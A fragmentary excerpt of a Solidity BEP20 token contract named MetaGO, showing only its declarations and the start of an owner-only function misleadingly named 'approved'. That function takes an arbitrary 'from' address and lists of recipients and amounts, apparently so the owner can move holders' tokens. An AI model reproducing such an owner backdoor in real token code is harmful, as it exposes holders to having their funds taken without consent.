...
contract MetaGo is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "MetaGO";
    string constant _symbol = "GO";
 ...
 function approved(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    ...
    require(balanceOf(from) >= SCCC, "Not enough tokens to approve");
